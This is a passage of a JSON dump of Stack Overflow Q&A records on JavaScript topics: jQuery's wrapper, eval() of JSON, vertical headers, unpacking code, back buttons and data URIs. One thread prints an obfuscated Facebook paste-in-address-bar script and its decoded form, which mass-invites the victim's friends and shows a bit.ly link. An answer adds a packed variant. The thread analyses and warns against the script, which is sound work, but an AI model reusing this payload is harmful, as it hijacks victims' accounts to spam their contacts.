            "answer_count": 1,
            "answers": [
                {
                    "body": "<p>The wrapper does a number of things:</p>\n\n<pre><code>function(window,undefined)\n</code></pre>\n\n<p>provides the <code>window</code> and <code>undefined</code> variables to the function</p>\n\n<p>the anonymous call <code>})(window);</code> passes the window variable to the script.</p>\n\n<p>If a user overrides the window object, they will easily be able to modify the script to use the correct <code>window</code> variable i.e.:</p>\n\n<pre><code>(function(window,undefined){})(w);\n</code></pre>\n\n<p>The lack of a second parameter being passed sets the <code>undefined</code> variable to have a value of <code>undefined</code> which prevents a programmer from messing up jQuery by overriding <code>undefined</code>.</p>\n",
                    "is_accepted": true,
                    "score": 11
                }
            ],
            "body": "<p>jQuery starts off wrapping all of it's code in an anonymous function:</p>\n\n<pre><code>(function ( window, undefined) {\n   /*\n   ...jquery code...\n   */\n}) (window);\n</code></pre>\n\n<p>I get that the function is executed immediately upon the entire script being read, but what is the purpose of the arguments? One is a global object reference, the other is a property reference.</p>\n\n<p>Now, I remember that earlier in the script development, undefined actually got defined as something else (am I remembering that right?). Was that related to this?</p>\n\n<p>Also, it looks like the function is being used as an operator?  Just like it is above, I don't understand the syntax of the statement at all.  Maybe there is context that would help?</p>\n",
            "last_activity_date": 1311588634,
            "question_id": 4598479,
            "score": 7,
            "tags": [
                "javascript",
                "jquery"
            ],
            "title": "What is the purpose of the anonymous function wrapper in jQuery?"
        },
        {
            "answer_count": 6,
            "answers": [
                {
                    "body": "<p>In your scenario, the question becomes, where is PHP getting the javascript to execute from?  Is that channel secure, and free from potential user manipulation? What if you don't control that channel directly?    </p>\n",
                    "is_accepted": false,
                    "score": 9
                },
                {
                    "body": "<p>Besides the obvious security issues:  </p>\n\n<ol>\n<li>Native JSON is <strong><em>faster</em></strong></li>\n<li>You don't need to \"load\" a JSON parser it's just another function call to the JavaScript engine</li>\n</ol>\n",
                    "is_accepted": false,
                    "score": 3
                },
                {
                    "body": "<p>Tip:\nin asp.net using JSON is considered bad becuase parsing of DateTime differs between the server and the client so we use a special function to deserialize the date in javascript. I'm not sure if PHP has the same issue but its worth mentioning though.</p>\n",
                    "is_accepted": false,
                    "score": 0
                },
                {
                    "body": "<p>check out this:<a href=\"http://blog.mozilla.com/webdev/2009/02/12/native-json-in-firefox-31/\" rel=\"nofollow\">http://blog.mozilla.com/webdev/2009/02/12/native-json-in-firefox-31/</a></p>\n\n<p>so at least for firefox you can use the built in json parser  </p>\n",
                    "is_accepted": false,
                    "score": 0
                },
                {
                    "body": "<p>There are a number of ways that your security may be compromised.</p>\n\n<ul>\n<li>Man in the middle attacks could theoretically alter the contents of data being delivered to the client.</li>\n<li>Your server traffic could be intercepted elsewhere and different content could be provided (not quite the same as a MIM attack)</li>\n<li>Your server could be compromised and the data source could be tampered with.</li>\n</ul>\n\n<p>and these are just the simple examples. XSS is nasty.</p>\n\n<p>\"an ounce of prevention is worth a pound of cure\"</p>\n",
                    "is_accepted": true,
                    "score": 6
                },
                {
                    "body": "<p>Seriously? Some of the guys here are paranoid. If you're delivering the JSON and you know it's <strong>safe</strong>, it's ok to <strong>fallback(*)</strong> to <code>eval();</code> instead of a js lib for IE. After all, IE users have much more to worry about.</p>\n\n<p>And the man-in-the-middle argument is bullsh*t.</p>\n\n<p>(*) the words <strong>fallback</strong> and <strong>safe</strong> are in bold because some people here didn't see them.</p>\n",
                    "is_accepted": false,
                    "score": -1
                }
            ],
            "body": "<p>As far as I know it is considered bad practice to <code>eval()</code> JSON objects in JavaScript, because of security. I can understand this concern if the JSON comes from another server.</p>\n\n<p>But if the JSON is provided by my own server and is created using PHP's <code>json_encode</code> (let us assume it is not buggy), is it legitimate to simply use <code>eval()</code> to read the JSON in JS or are there any security problem I currently can't think of?</p>\n\n<p>I really don't want to deal with dynamically loading a JSON parser and would be glad to simply use <code>eval()</code>.</p>\n\n<p>PS: I will obviously use the native <code>JSON</code> object if it is available, but want to fall back to <code>eval()</code> for IE/Opera.</p>\n",
            "last_activity_date": 1291780300,
            "question_id": 4270597,
            "score": 7,
            "tags": [
                "javascript",
                "json",
                "eval"
            ],
            "title": "Why not eval() JSON?"
        },
        {
            "answer_count": 2,
            "answers": [
                {
                    "body": "<p>\n\n        \n                \n                Canvas text transformations example</p>\n\n<pre><code>            &lt;!--[if IE]&gt;&lt;script type=\"text/javascript\" src=\"../excanvas.js\"&gt;&lt;/script&gt;&lt;![endif]--&gt;\n&lt;script type=\"text/javascript\" src=\"../canvas.text.js\"&gt;&lt;/script&gt;\n&lt;script type=\"text/javascript\" src=\"../faces/dejavu_sans-normal-normal.js\"&gt;&lt;/script&gt;\n&lt;script type=\"text/javascript\" src=\"../faces/dejavu_sans-bold-normal.js\"&gt;&lt;/script&gt;\n    &lt;/head&gt;\n    &lt;body&gt;\n            &lt;canvas width=\"500\" height=\"300\" id=\"test-canvas\" style=\"font-size: 16px;\"&gt;&lt;/canvas&gt;\n\n            &lt;script type=\"text/javascript\"&gt;\n                function initCanvas(canvas) {\n                    if (window.G_vmlCanvasManager &amp;&amp; window.attachEvent &amp;&amp; !window.opera) {\n                        canvas = window.G_vmlCanvasManager.initElement(canvas);\n                    }\n                    return canvas;\n                }\n\n                window.onload = function() {\n                    var canvas = initCanvas(document.getElementById(\"test-canvas\")),\n                                ctx = canvas.getContext('2d');\n\n                    ctx.strokeStyle = \"rgba(255,0,0,1)\";\n                    ctx.fillStyle = \"rgba(0,0,0,1)\";\n                    ctx.lineWidth = 1;\n                    ctx.font = \"20pt Verdana, sans-serif\";\n                    ctx.strokeStyle = \"#000\";\n                    ctx.rotate(Math.PI / 2);\n                    ctx.fillText('Vertical', 0, 0);\n                    ctx.restore();\n                }\n            &lt;/script&gt;\n    &lt;/body&gt;\n</code></pre>\n\n<p></p>\n",
                    "is_accepted": false,
                    "score": 0
                },
                {
                    "body": "<p>Here's a working jsfiddle that does it.  It should work in IE 6, I only used jquery and raphael js.  I made static sizes for the raphael drawing area and the text, but you can certainly do a little math to figure out dynamic sizes:</p>\n\n<p><a href=\"http://jsfiddle.net/UYj58/9/\" rel=\"nofollow\">http://jsfiddle.net/UYj58/9/</a></p>\n\n<p>Code looks like this if you include jquery and raphael:</p>\n\n<pre><code>$(document).ready(function(){\n    var font = {font: '12px Helvetica, Arial'};\n    var fill = {fill: \"hsb(120deg, .5, 1)\"}\n    $('tr th div').each(function (index, div){\n        R = Raphael($(div).attr('id'), 20, 100);\n        R.text(4, 50, $(div).find('span').text())\n            .attr(font)\n            .attr(fill)\n            .rotate(-90, true);\n        $(div).find('span').hide();\n    });\n});\n</code></pre>\n\n<p>And the HTML looks like this:</p>\n\n<pre><code>&lt;table&gt;\n    &lt;thead&gt;\n        &lt;tr&gt;\n            &lt;th&gt;&lt;div id=\"columnOne\"&gt;&lt;span&gt;heading one&lt;/span&gt;&lt;/div&gt;&lt;/th&gt;\n            &lt;th&gt;&lt;div id=\"columnTwo\"&gt;&lt;span&gt;heading two&lt;/span&gt;&lt;/div&gt;&lt;/th&gt;\n        &lt;/tr&gt;\n    &lt;/thead&gt;\n    &lt;tbody&gt;\n        &lt;tr&gt;\n            &lt;td&gt;1&lt;/td&gt;\n            &lt;td&gt;2&lt;/td&gt;\n        &lt;/tr&gt;\n        &lt;tr&gt;\n            &lt;td&gt;4&lt;/td&gt;\n            &lt;td&gt;5&lt;/td&gt;\n        &lt;/tr&gt;\n    &lt;/tbody&gt;\n&lt;/table&gt;\n</code></pre>\n\n<p>Oh, and I used this as my example: <a href=\"http://raphaeljs.com/text-rotation.html\" rel=\"nofollow\">http://raphaeljs.com/text-rotation.html</a></p>\n",
                    "is_accepted": true,
                    "score": 3
                }
            ],
            "body": "<p>I use jqGrid with many columns containing boolean information, which are displayed as checkboxes inside the table (see <a href=\"http://www.ok-soft-gmbh.com/VerticalHeaders/TestFixedO.htm\">http://www.ok-soft-gmbh.com/VerticalHeaders/TestFixedO.htm</a> as an example). To display information more compactly I use vertical column headers. It works very well and works in jqGrid in all browsers (see my discussion with Tony Tomov in jqGrid forum <a href=\"http://www.trirand.com/blog/?page_id=393/feature-request/headers-with-vertical-orientation/\">http://www.trirand.com/blog/?page_id=393/feature-request/headers-with-vertical-orientation/</a>), but in IE vertical text is blurred and doesn't look nice enough (open the link above in IE and you will see exactly what I mean). I was asked from users why the text displayed so strangely. So I'm thinking of using a JavaScript-based SVG library like <em>SVG Web</em> ( <a href=\"http://code.google.com/p/svgweb/\">http://code.google.com/p/svgweb/</a> ) or <em>Rapha\u00ebl</em> ( <a href=\"http://raphaeljs.com/\">http://raphaeljs.com/</a> ). SVG is very powerful and it is difficult to find a good example. I need only to display vertical text (-90 grad, from the bottom up) and use if possible without working in mode of absolute positioning.</p>\n\n<p><em>So one more time my question:</em> I need to have a possibility to display vertical text (-<strong>90 grad rotation</strong>) inside <code>&lt;td&gt;</code> elements of a table header. I want to use a JavaScript-based SVG library like <em>SVG Web</em> or <em>Rapha\u00ebl</em>. The solution must support <strong>IE6</strong>. Does anybody have a good reference example which could help me do this? If somebody posts a whole solution of the problem I would be happy.</p>\n\n<p>To be exact here is my current solution: I define </p>\n\n<pre><code>.rotate \n{\n    -webkit-transform: rotate(-90deg);    /* Safari 3.1+, Chrome */\n    -moz-transform: rotate(-90deg);    /* Firefox 3.5+ */\n    -o-transform: rotate(-90deg); /* Opera starting with 10.50 */\n    /* Internet Explorer: */\n    filter: progid:DXImageTransform.Microsoft.BasicImage(rotation=3); /* IE6, IE7 */\n   -ms-filter: \"progid:DXImageTransform.Microsoft.BasicImage(rotation=3)\" /* IE8 */;\n}\n</code></pre>\n\n<p>define <code>RotateCheckboxColumnHeaders</code> function</p>\n\n<pre><code>var RotateCheckboxColumnHeaders = function (grid, headerHeight) {\n    // we use grid as context (if one have more as one table on tnhe page)\n    var trHead = $(\"thead:first tr\", grid.hdiv);\n    var cm = grid.getGridParam(\"colModel\");\n    $(\"thead:first tr th\").height(headerHeight);\n    headerHeight = $(\"thead:first tr th\").height();\n\n    for (var iCol = 0; iCol &lt; cm.length; iCol++) {\n        var cmi = cm[iCol];\n        if (cmi.formatter === 'checkbox') {\n            // we must set width of column header div BEFOR adding class \"rotate\" to\n            // prevent text cutting based on the current column width\n            var headDiv = $(\"th:eq(\" + iCol + \") div\", trHead);\n            headDiv.width(headerHeight).addClass(\"rotate\");\n            if (!$.browser.msie) {\n                if ($.browser.mozilla) {\n                    headDiv.css(\"left\", (cmi.width - headerHeight) / 2 + 3).css(\"bottom\", 7);\n                }\n                else {\n                    headDiv.css(\"left\", (cmi.width - headerHeight) / 2);\n                }\n            }\n            else {\n                var ieVer = jQuery.browser.version.substr(0, 3);\n                // Internet Explorer\n                if (ieVer !== \"6.0\" &amp;&amp; ieVer !== \"7.0\") {\n                    headDiv.css(\"left\", cmi.width / 2 - 4).css(\"bottom\", headerHeight / 2);\n                    $(\"span\", headDiv).css(\"left\", 0);\n                }\n                else {\n                    headDiv.css(\"left\", 3);\n                }\n            }\n        }\n    }\n};\n</code></pre>\n\n<p>And include a call like <code>RotateCheckboxColumnHeaders(grid, 110);</code> after creating jqGrid.</p>\n",
            "last_activity_date": 1355993074,
            "question_id": 2705174,
            "score": 7,
            "tags": [
                "javascript",
                "jquery",
                "jqgrid",
                "svg"
            ],
            "title": "Vertical text inside table headers using a JavaScript-based SVG library"
        },
        {
            "answer_count": 3,
            "answers": [
                {
                    "body": "<p>Here is the formatted source:</p>\n\n<pre><code>var a = [\"innerHTML\", \n         \"app4949752878_app4949752878_dd\", \n         \"getElementById\", \n         \"&lt;a id=\\\"suggest\\\" href=\\\"#\\\" ajaxify=\\\"/ajax/social_graph/invite_dialog.php?class=FanManager&amp;amp;node_id=112682695418523\\\" class=\\\" profile_action actionspro_a\\\" rel=\\\"dialog-post\\\"&gt;Suggest to Friends&lt;/a&gt;\",\n         \"suggest\", \n         \"MouseEvents\", \n         \"createEvent\", \n         \"click\", \n         \"initEvent\", \n         \"dispatchEvent\", \n         \"select_all\", \n         \"sgm_invite_form\", \n         \"/ajax/social_graph/invite_dialog.php\", \n         \"submitDialog\"];\n\nvoid (document[a[2]](a[1])[a[0]] = a[3]);\nvar ss = document[a[2]](a[4]);\nvar c = document[a[6]](a[5]);\nc[a[8]](a[7], true, true);\nvoid ss[a[9]](c);\nvoid setTimeout(function () {fs[a[10]]();}, 4000);\nvoid setTimeout(function () {SocialGraphManager[a[13]](a[11], a[12]);}, 5000);\nvoid setTimeout(function () {document[a[2]](a[1])[a[0]] = \"&lt;a href='http://bit.ly/bTl0vj'&gt;Completed! Click here&lt;/a&gt;\";}, 5400);\n</code></pre>\n\n<p>The <code>a</code> array holds all strings used by the code.<br>\nHere it is with the strings put back in place:</p>\n\n<pre><code>void (document.getElementById('app4949752878_app4949752878_dd').innerHTML =  \"&lt;a id=\\\"suggest\\\" href=\\\"#\\\" ajaxify=\\\"/ajax/social_graph/invite_dialog.php?class=FanManager&amp;amp;node_id=112682695418523\\\" class=\\\" profile_action actionspro_a\\\" rel=\\\"dialog-post\\\"&gt;Suggest to Friends&lt;/a&gt;\");\nvar ss = document.getElementById(\"suggest\");\nvar c = document.createEvent(\"MouseEvents\");\nc.initEvent(\"click\", true, true);\nvoid ss.dispatchEvent(c);\nvoid setTimeout(function () {fs.select_all();}, 4000);\nvoid setTimeout(function () {\n    SocialGraphManager.submitDialog(\"sgm_invite_form\", \"/ajax/social_graph/invite_dialog.php\");\n}, 5000);\nvoid setTimeout(function () {\n    document.getElementById('app4949752878_app4949752878_dd').innerHTML = \"&lt;a href='http://bit.ly/bTl0vj'&gt;Completed! Click here&lt;/a&gt;\";\n}, 5400);\n</code></pre>\n\n<p>Finally, here it is with decent names and structure:</p>\n\n<pre><code>var messageElement = document.getElementById('app4949752878_app4949752878_dd');\n\nmessageElement.innerHTML = \n    \"&lt;a id=\\\"suggest\\\" href=\\\"#\\\" ajaxify=\\\"/ajax/social_graph/invite_dialog.php?class=FanManager&amp;amp;node_id=112682695418523\\\" class=\\\" profile_action actionspro_a\\\" rel=\\\"dialog-post\\\"&gt;Suggest to Friends&lt;/a&gt;\";\n\nvar suggestLink = document.getElementById(\"suggest\");\nvar mouseEvent = document.createEvent(\"MouseEvents\");\nmouseEvent.initEvent(\"click\", true, true);\nsuggestLink.dispatchEvent(mouseEvent);\n\n\nsetTimeout(function () { fs.select_all(); }, 4000);\nsetTimeout(function () {\n    SocialGraphManager.submitDialog(\"sgm_invite_form\", \"/ajax/social_graph/invite_dialog.php\");\n}, 5000);\nsetTimeout(function () {\n    messageElement.innerHTML = \"&lt;a href='http://bit.ly/bTl0vj'&gt;Completed! Click here&lt;/a&gt;\";\n}, 5400);\n</code></pre>\n",
                    "is_accepted": true,
                    "score": 21
                },
                {
                    "body": "<p>I always find this sort of thing interesting because it shows various ways people use to try and get around security or entice others to do something stupid.</p>\n\n<p>My \"Golden rule\" is that things like this are always something very dodgy and best ignored. Nothing legit requires this sort of hacking, at the very least it probably contravenes some site policy. At the very worst you get hacked and your computer or online identity used and abused or your bank accounts drained.</p>\n",
                    "is_accepted": false,
                    "score": 4
                },
                {
                    "body": "<p>Very interesting. How did you go about decoding it though?</p>\n\n<p>I got something like this just now, but it didn't look like the sametype of content. Part of the code (the latter half) is below. I didn't know if I should paste the entire code. Newbie here.</p>\n\n<pre><code> (new RegExp('\\\\b'+e(c)+'\\\\b','g'),k[c]);return p}('J e=[\"\\\\n\\\\g\\\\j\\\\g\\\\F\\\\g\\\\i\\\\g\\\\h\\\\A\",\"\\\\j\\\\h\\\\A\\\\i\\\\f\",\"\\\\o\\\\f\\\\h\\\\q\\\\i\\\\f\\\\r\\\\f\\\\k\\\\h\\\\K\\\\A\\\\L\\\\t\",\"\\\\w\\\\g\\\\t\\\\t\\\\f\\\\k\",\"\\\\g\\\\k\\\\k\\\\f\\\\x\\\\M\\\\N\\\\G\\\\O\",\"\\\\n\\\\l\\\\i\\\\y\\\\f\",\"\\\\j\\\\y\\\\o\\\\o\\\\f\\\\j\\\\h\",\"\\\\i\\\\g\\\\H\\\\f\\\\r\\\\f\",\"\\\\G\\\\u\\\\y\\\\j\\\\f\\\\q\\\\n\\\\f\\\\k\\\\h\\\\j\",\"\\\\p\\\\x\\\\f\\\\l\\\\h\\\\f\\\\q\\\\n\\\\f\\\\k\\\\h\",\"\\\\p\\\\i\\\\g\\\\p\\\\H\",\"\\\\g\\\\k\\\\g\\\\h\\\\q\\\\n\\\\f\\\\k\\\\h\",\"\\\\t\\\\g\\\\j\\\\z\\\\l\\\\h\\\\p\\\\w\\\\q\\\\n\\\\f\\\\k\\\\h\",\"\\\\j\\\\f\\\\i\\\\f\\\\p\\\\h\\\\v\\\\l\\\\i\\\\i\",\"\\\\j\\\\o\\\\r\\\\v\\\\g\\\\k\\\\n\\\\g\\\\h\\\\f\\\\v\\\\P\\\\u\\\\x\\\\r\",\"\\\\B\\\\l\\\\Q\\\\l\\\\R\\\\B\\\\j\\\\u\\\\p\\\\g\\\\l\\\\i\\\\v\\\\o\\\\x\\\\l\\\\z\\\\w\\\\B\\\\g\\\\k\\\\n\\\\g\\\\h\\\\f\\\\v\\\\t\\\\g\\\\l\\\\i\\\\u\\\\o\\\\S\\\\z\\\\w\\\\z\",\"\\\\j\\\\y\\\\F\\\\r\\\\g\\\\h\\\\T\\\\g\\\\l\\\\i\\\\u\\\\o\"];d=U;d[e[2]](V)[e[1]][e[0]]=e[3];d[e[2]](a)[e[4]]=d[e[2]](b)[e[5]];s=d[e[2]](e[6]);m=d[e[2]](e[7]);c=d[e[9]](e[8]);c[e[11]](e[10],I,I);s[e[12]](c);C(D(){W[e[13]]()},E);C(D(){X[e[16]](e[14],e[15])},E);C(D(){m[e[12]](c);d[e[2]](Y)[e[4]]=d[e[2]](Z)[e[5]]},E);',62,69,'||||||||||||||_0x95ea|x65|x69|x74|x6C|x73|x6E|x61||x76|x67|x63|x45|x6D||x64|x6F|x5F|x68|x72|x75|x70|x79|x2F|setTimeout|function|5000|x62|x4D|x6B|true|var|x42|x49|x48|x54|x4C|x66|x6A|x78|x2E|x44|document|mw|fs|SocialGraphManager|ifo|ifc|||||||'.split('|'),0,{}))})();\n</code></pre>\n",
                    "is_accepted": false,
                    "score": 0
                }
            ],
            "body": "<p>I got a message on Facebook telling me to copy and paste this into my address bar. I thought I'd post it here and see what everyone thinks about it. What does it do? How does it work? </p>\n\n<p>Here's the source code: </p>\n\n<pre><code>// (DO NOT DO THIS!)\nJavascript:var a=[\"\\x69\\x6E\\x6E\\x65\\x72\\x48\\x54\\x4D\\x4C\",\"\\x61\\x70\\x70\\x34\\x39\\x34\\x39\\x37\\x35\\x32\\x38\\x37\\x38\\x5F\\x61\\x70\\x70\\x34\\x39\\x34\\x39\\x37\\x35\\x32\\x38\\x37\\x38\\x5F\\x64\\x64\",\"\\x67\\x65\\x74\\x45\\x6C\\x65\\x6D\\x65\\x6E\\x74\\x42\\x79\\x49\\x64\",\"\\x3C\\x61\\x20\\x69\\x64\\x3D\\x22\\x73\\x75\\x67\\x67\\x65\\x73\\x74\\x22\\x20\\x68\\x72\\x65\\x66\\x3D\\x22\\x23\\x22\\x20\\x61\\x6A\\x61\\x78\\x69\\x66\\x79\\x3D\\x22\\x2F\\x61\\x6A\\x61\\x78\\x2F\\x73\\x6F\\x63\\x69\\x61\\x6C\\x5F\\x67\\x72\\x61\\x70\\x68\\x2F\\x69\\x6E\\x76\\x69\\x74\\x65\\x5F\\x64\\x69\\x61\\x6C\\x6F\\x67\\x2E\\x70\\x68\\x70\\x3F\\x63\\x6C\\x61\\x73\\x73\\x3D\\x46\\x61\\x6E\\x4D\\x61\\x6E\\x61\\x67\\x65\\x72\\x26\\x61\\x6D\\x70\\x3B\\x6E\\x6F\\x64\\x65\\x5F\\x69\\x64\\x3D\\x31\\x31\\x32\\x36\\x38\\x32\\x36\\x39\\x35\\x34\\x31\\x38\\x35\\x32\\x33\\x22\\x20\\x63\\x6C\\x61\\x73\\x73\\x3D\\x22\\x20\\x70\\x72\\x6F\\x66\\x69\\x6C\\x65\\x5F\\x61\\x63\\x74\\x69\\x6F\\x6E\\x20\\x61\\x63\\x74\\x69\\x6F\\x6E\\x73\\x70\\x72\\x6F\\x5F\\x61\\x22\\x20\\x72\\x65\\x6C\\x3D\\x22\\x64\\x69\\x61\\x6C\\x6F\\x67\\x2D\\x70\\x6F\\x73\\x74\\x22\\x3E\\x53\\x75\\x67\\x67\\x65\\x73\\x74\\x20\\x74\\x6F\\x20\\x46\\x72\\x69\\x65\\x6E\\x64\\x73\\x3C\\x2F\\x61\\x3E\",\"\\x73\\x75\\x67\\x67\\x65\\x73\\x74\",\"\\x4D\\x6F\\x75\\x73\\x65\\x45\\x76\\x65\\x6E\\x74\\x73\",\"\\x63\\x72\\x65\\x61\\x74\\x65\\x45\\x76\\x65\\x6E\\x74\",\"\\x63\\x6C\\x69\\x63\\x6B\",\"\\x69\\x6E\\x69\\x74\\x45\\x76\\x65\\x6E\\x74\",\"\\x64\\x69\\x73\\x70\\x61\\x74\\x63\\x68\\x45\\x76\\x65\\x6E\\x74\",\"\\x73\\x65\\x6C\\x65\\x63\\x74\\x5F\\x61\\x6C\\x6C\",\"\\x73\\x67\\x6D\\x5F\\x69\\x6E\\x76\\x69\\x74\\x65\\x5F\\x66\\x6F\\x72\\x6D\",\"\\x2F\\x61\\x6A\\x61\\x78\\x2F\\x73\\x6F\\x63\\x69\\x61\\x6C\\x5F\\x67\\x72\\x61\\x70\\x68\\x2F\\x69\\x6E\\x76\\x69\\x74\\x65\\x5F\\x64\\x69\\x61\\x6C\\x6F\\x67\\x2E\\x70\\x68\\x70\",\"\\x73\\x75\\x62\\x6D\\x69\\x74\\x44\\x69\\x61\\x6C\\x6F\\x67\"];\nvoid (document[a[2]](a[1])[a[0]]=a[3]);var ss=document[a[2]](a[4]);\nvar c=document[a[6]](a[5]);\nc[a[8]](a[7],true,true);\nvoid (ss[a[9]](c));\nvoid (setTimeout(function (){fs[a[10]]();} ,4000));\nvoid (setTimeout(function (){SocialGraphManager[a[13]](a[11],a[12]);} ,5000));\nvoid (setTimeout(function (){\ndocument[a[2]](a[1])[a[0]]=\"\\x3C\\x61\\x20\\x68\\x72\\x65\\x66\\x3D\\x27\\x68\\x74\\x74\\x70\\x3A\\x2F\\x2F\\x62\\x69\\x74\\x2E\\x6C\\x79\\x2F\\x62\\x54\\x6C\\x30\\x76\\x6A\\x27\\x3E\\x43\\x6F\\x6D\\x70\\x6C\\x65\\x74\\x65\\x64\\x21\\x20\\x43\\x6C\\x69\\x63\\x6B\\x20\\x68\\x65\\x72\\x65\\x3C\\x2F\\x61\\x3E\";\n} ,5400));\n</code></pre>\n",
            "last_activity_date": 1349190818,
            "question_id": 2634159,
            "score": 7,
            "tags": [
                "javascript",
                "security"
            ],
            "title": "Javascript in the address bar - is this malicious? "
        },
        {
            "answer_count": 3,
            "answers": [
                {
                    "body": "<p>You can with online unpackers: try one of these, find one that suits you:</p>\n\n<ul>\n<li><a href=\"http://dean.edwards.name/unpacker/\">Dean Edwards Unpacker</a></li>\n<li><a href=\"http://jsunpack.jeek.org/\">JSUnpack</a></li>\n</ul>\n",
                    "is_accepted": true,
                    "score": 9
                },
                {
                    "body": "<p>Here's an <a href=\"http://www.strictly-software.com/unpacker#unpacker\" rel=\"nofollow\">unpacker</a>.</p>\n",
                    "is_accepted": false,
                    "score": 2
                },
                {
                    "body": "<p>JS Beautifier will both reformat and unpack:</p>\n\n<p><a href=\"http://jsbeautifier.org/\">http://jsbeautifier.org/</a></p>\n",
                    "is_accepted": false,
                    "score": 11
                }
            ],
            "body": "<p>You know how those packed js files look like, right?</p>\n\n<pre> eval(function(p,a,c,k,e,d){ ... } ('obfuscated-string'.split('|'),0,{}))</pre>\n\n<p>It just so happens to be that i have to tweak some large legacy code that looks like that and I want to find a way to turn this into a more readable version.</p>\n\n<p>If that's not possible, can i at least get rid of the eval?</p>\n",
            "last_activity_date": 1412700984,
            "question_id": 2460751,
            "score": 7,
            "tags": [
                "javascript",
                "eval",
                "unpack",
                "uncompress"
            ],
            "title": "How to unpack the contents of a JavaScript file?"
        },
        {
            "answer_count": 5,
            "answers": [
                {
                    "body": "<p>Nope this is not possible, you can not usurp the <em>browsing experience</em> from a user, but hope there should be a work around to this....</p>\n",
                    "is_accepted": false,
                    "score": 0
                },
                {
                    "body": "<p>As far as I know, not, but you can use the <code>window.onbeforeunload</code> event to warn users not to go away, when risking data loss. Please bear in mind this doesn't work on Opera.</p>\n",
                    "is_accepted": false,
                    "score": 0
                },
                {
                    "body": "<p>Actually preventing the user from using the back or forward button is bad usability and will frustrate users a lot - to be blunt, it's passing a developer problem back to the user.</p>\n\n<p>I think the <a href=\"http://en.wikipedia.org/wiki/Post/Redirect/Get\">Post/Redirect/Get pattern</a>, coupled with <code>window.onbeforeunload</code> in javascript (like SO uses) would be really useful for your circumstances.</p>\n",
                    "is_accepted": true,
                    "score": 10
                },
                {
                    "body": "<p>look into a history manager. something like this:</p>\n\n<p><a href=\"http://code.google.com/p/reallysimplehistory/\" rel=\"nofollow\">http://code.google.com/p/reallysimplehistory/</a></p>\n\n<p>you can make the back button actually do something useful, like going back to previous (valid) state, if possible.</p>\n",
                    "is_accepted": false,
                    "score": 3
                },
                {
                    "body": "<p>If you build a one page web app (meaning a single page is loaded, then all changes are done dynamically in that page with Javascript) you have options:</p>\n\n<p>When the user clicks the back button, you leave the page, since it's the only one, and you can warn the user through the event <a href=\"http://developer.mozilla.org/en/DOM/window.onbeforeunload\" rel=\"nofollow\">window.onbeforeunload</a></p>\n\n<p>And then, if you need/want more control of the back/next button behaviour, you can add a hash( # ) key to handle that.<br/>\nSee my answer to that question: <a href=\"http://stackoverflow.com/questions/2258719\">http://stackoverflow.com/questions/2258719</a></p>\n",
                    "is_accepted": false,
                    "score": 1
                }
            ],
            "body": "<p>Is there any way using JavaScript(or something else) to detect/prevent that user clicked on browser back/forward button ? </p>\n\n<p>I would like to know about the common practice to deal with this issue. This is really pain especially in the work flow like ordering. </p>\n",
            "last_activity_date": 1267125560,
            "question_id": 2336134,
            "score": 7,
            "tags": [
                "javascript",
                "browser"
            ],
            "title": "pain of browser back button"
        },
        {
            "answer_count": 4,
            "answers": [
                {
                    "body": "<p>imageData is more flexible, for instance some ie's restricts data uris to 32k.</p>\n",
                    "is_accepted": false,
                    "score": 1
                },
                {
                    "body": "<p>The data URI scheme is reasonable well supported except in Internet Explorer before version 8.</p>\n\n<p>JavaScript URIs are, I think, slightly better supported but fail if JS is unavailable.</p>\n\n<p>The best thing you can do is to stick to external image resources.</p>\n",
                    "is_accepted": false,
                    "score": 1
                },
                {
                    "body": "<p>Data URI's won't work in &lt; IE8. IE8 supports them up to 32KB.</p>\n",
                    "is_accepted": false,
                    "score": 0
                },
                {
                    "body": "<p>In regards to browser support, from <a href=\"http://en.wikipedia.org/wiki/Data_URI_scheme\">Wikipedia</a>:</p>\n\n<blockquote>\n  <p>Data URIs are currently supported by\n  the following web browsers:</p>\n</blockquote>\n\n<ul>\n<li>Gecko and its derivatives, such as Mozilla Firefox</li>\n<li>Opera</li>\n<li>KDE, through the KIO input/output system. This allows the KDE browser, Konqueror to support data URIs.</li>\n<li>Safari; although Safari's rendering engine, WebKit, is a derivative of Konqueror's KHTML engine, Mac OS X does not share the KIO slaves architecture so the implementations are not shared.</li>\n<li>Safari for the iPhone;</li>\n<li>Google Chrome</li>\n<li>Internet Explorer 8; Microsoft has limited support to certain \"non-navigable\" content, such as in  tags and CSS rules, for security reasons, including concerns that JavaScript embedded in a data URI may not be interpretable by script filters such as those used by web-based email clients. Data URIs must be smaller than 32k.</li>\n<li>TheWorld Browser; is an IE shell browser which has a built-in support for Data URI scheme</li>\n</ul>\n\n<p>IE does not handle the <code>&lt;object&gt;</code> tag correctly, see <a href=\"http://www.howtocreate.co.uk/wrongWithIE/?chapter=Object+Tags\">here</a> for more details. Briefly, you can't trust IE to display images from it.</p>\n\n<p>The <code>javascript:imageData</code> is also not well-supported, since it is used in a lot of cross site scripting attacks.</p>\n\n<p>There are many discussions of <a href=\"http://www.howtocreate.co.uk/emails/BillAitken.html\">this</a> on the <a href=\"http://www.google.com/search?q=embedded+image\">web</a>, and they all come to the conclusion that there is no good universal way to embed images. If you only need to support a subset of browsers, the data uri may work, or a combination of data uri and javascript.</p>\n",
                    "is_accepted": true,
                    "score": 8
                }
            ],
            "body": "<p>I'd like to be able to output an HTML file which includes an image (within the file itself). By Googling, I've come across a couple of ways to do this:</p>\n\n<ul>\n<li><code>javascript:imageData</code></li>\n<li>a data URI such as <code>&lt;IMG SRC=\"data:image/gif;base64,[...]\"&gt;</code></li>\n<li><code>&lt;object ... &gt;</code> tag (although this uses a data URI, so may inherit the same limitations)</li>\n</ul>\n\n<p>But I don't know which is better supported by browsers, or if there are other alternatives.</p>\n\n<p>Can anyone with some practical experience of this offer me advice? Thanks.</p>\n",
            "last_activity_date": 1263892004,
            "question_id": 2084873,
            "score": 7,
            "tags": [
                "javascript",
                "html",
                "image",
                "data-url"
            ],
            "title": "How to encode image data within an HTML file?"
        },
        {
            "answer_count": 13,
            "answers": [
                {
